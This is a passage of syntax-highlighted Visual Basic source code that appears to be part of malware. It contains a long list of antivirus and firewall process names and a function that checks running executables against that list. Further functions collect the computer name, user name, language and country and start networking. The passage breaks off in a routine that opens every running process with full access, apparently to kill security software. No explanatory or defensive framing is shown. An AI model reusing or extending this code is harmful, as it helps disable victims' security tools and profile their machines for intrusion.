</span><span class="sc4">"nsched32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcciomon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pccmain.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pview95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Avnt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Claw95cf.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Dvp95_0.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Vscan40.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Icsuppnt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Jedi.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"N32scanw.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Pavsched.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Pavw.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Avrep32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Monitor.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"fsgk32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsm32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsma32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsmb32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"gbmenu"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"GBPOLL"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"GENERICS"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"GUARD"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"IAMSTATS"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ISRV95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"LDPROMENU"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"LDSCAN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"LUSPT"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MCMNHDLR"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MCTOOL"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MCUPDATE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MCVSRTE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MGHTML"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MINILOG"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MCVSSHLD"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MCAGENT"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MPFSERVICE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MWATCH"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NeoWatchLog"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NVSVC32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NWService"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NTXconfig"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NTVDM"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ntrtscan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"npssvc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"npscheck"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"netutils"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ndd32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NAVENGNAVEX15"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"notstart.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zapro.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pqremove.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"BullGuard"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"CCAPP.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vet98.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VET32.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VCONTROL.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"claw95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ANTS"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ATCON"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ATUPDATER"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ATWATCH"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AutoTrace"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVGCC32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AvgServ"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVWINNT"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fnrb32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsaa"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fsav32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ZAP.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ZAPD.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ZAPPRG.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ZAPS.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ZCAP.EXE"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">BScanExe</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">ExeNm</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">BScanExe</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">BScan</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">BScan</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">MsD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Msn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Mn1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"~1"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Mn1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">MsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">MsD</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Mn1</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">MSN2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"~1"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">MSN2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Msn</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Msn</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">MsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">MsD</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">MSN2</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">StartWinsock</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">StartupData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc0">
</span><span class="sc7">StartWinsock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IIf</span><span class="sc6">(</span><span class="sc7">WSAStartup</span><span class="sc6">(</span><span class="sc2">&amp;H101</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">StartupData</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAIsBlocking</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSACancelBlockingCall</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSACleanup</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">LanguageID</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">LCID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetSystemDefaultLangID</span><span class="sc6">():</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">GetLocaleInfo</span><span class="sc6">(</span><span class="sc7">LCID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">LOCALE_SNATIVELANGNAME</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">LanguageID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Trim$</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">PaisID</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">LCID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetSystemDefaultLangID</span><span class="sc6">():</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">GetLocaleInfo</span><span class="sc6">(</span><span class="sc7">LCID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">LOCALE_SCOUNTRY</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sBuf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">PaisID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Trim$</span><span class="sc6">(</span><span class="sc7">sBuf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">BGetComputerName</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lBufSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lStatus</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">lBufSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sBuffer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">String$</span><span class="sc6">(</span><span class="sc7">lBufSize</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">lStatus</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetComputerName</span><span class="sc6">(</span><span class="sc7">sBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lBufSize</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">lStatus</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">BGetComputerName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">sBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lBufSize</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetUser</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lpUserID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">lpUserID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">(</span><span class="sc2">25</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">nBuffer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">
</span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetUserName</span><span class="sc6">(</span><span class="sc7">lpUserID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nBuffer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ret</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">GetUser</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">lpUserID</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">KantiNT</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NumElements</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ProcessIDs</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sModName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">96</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">&lt;=</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0">
       </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">ProcessIDs</span><span class="sc6">(</span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc6">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EnumProcesses</span><span class="sc6">(</span><span class="sc7">ProcessIDs</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0">
    
</span><span class="sc7">NumElements</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc6">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">NumElements</span><span class="sc0">
      
        </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ProcessIDs</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
